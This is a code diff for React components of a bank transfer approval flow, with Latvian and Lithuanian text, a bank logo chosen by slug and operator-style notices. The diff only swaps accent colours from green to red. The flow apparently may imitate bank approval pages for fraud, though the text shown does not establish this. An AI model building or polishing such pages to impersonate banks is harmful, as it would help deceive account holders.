@@ -444,7 +444,7 @@ function TransferApprovalCard({
               <img
                 src={bankLogo}
                 alt={bankName || bankSlug || "Banka"}
-                className="h-10 w-10 rounded-full border border-[#4ade80]/30 bg-white object-cover shadow-sm"
+                className="h-10 w-10 rounded-full border border-[#ff5257]/30 bg-white object-cover shadow-sm"
               />
             ) : null}
           </div>
@@ -513,7 +513,7 @@ function SpecialNoticeCard({ message, imageUrl, saving, onContinue }: { message:
             />
           </div>
 
-          <div className="mb-5 rounded-[1.2rem] border border-[#4ade80]/20 bg-black/20 px-4 py-4 sm:px-5">
+          <div className="mb-5 rounded-[1.2rem] border border-[#ff5257]/20 bg-black/20 px-4 py-4 sm:px-5">
             <p className="whitespace-pre-wrap text-base font-semibold leading-7 text-white/92 sm:text-lg">
               <Linkify text={message} />
             </p>
@@ -525,8 +525,8 @@ function SpecialNoticeCard({ message, imageUrl, saving, onContinue }: { message:
             </div>
           ) : null}
 
-          <div className="pak-form-security justify-center border-t border-[#4ade80]/15 pt-4 text-center">
-            <svg className="h-7 w-7 shrink-0 text-[#4ade80]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
+          <div className="pak-form-security justify-center border-t border-[#ff5257]/15 pt-4 text-center">
+            <svg className="h-7 w-7 shrink-0 text-[#ff5257]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
               <path d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" strokeLinecap="round" strokeLinejoin="round" />
             </svg>
             <span>Klientu apkalpošana droši pārbauda jūsu pieprasījumu.</span>
@@ -719,14 +719,14 @@ export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
       <div className="pak-page-shell">
         <div className="pak-form-card w-full max-w-[360px]">
           <div className="pak-form-inner px-7 py-10 text-center">
-            <div className="mx-auto mb-4 flex h-14 w-14 items-center justify-center rounded-full border border-[#4ade80]/40 bg-[#4ade80]/15 text-[#4ade80]">
+            <div className="mx-auto mb-4 flex h-14 w-14 items-center justify-center rounded-full border border-[#ff5257]/40 bg-[#ff5257]/15 text-[#ff5257]">
               <svg className="h-7 w-7" fill="none" stroke="currentColor" strokeWidth={2.5} viewBox="0 0 24 24">
                 <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
               </svg>
             </div>
             <h1 className="text-xl font-extrabold text-white">Patvirtinta!</h1>
             <p className="mt-2 text-sm text-white/60">Lūdzu, uzgaidiet, notiek pāradresācija...</p>
-            <div className="mx-auto mt-5 h-6 w-6 animate-spin rounded-full border-[3px] border-[#4ade80]/25 border-t-[#4ade80]" />
+            <div className="mx-auto mt-5 h-6 w-6 animate-spin rounded-full border-[3px] border-[#ff5257]/25 border-t-[#ff5257]" />
           </div>
         </div>
       </div>
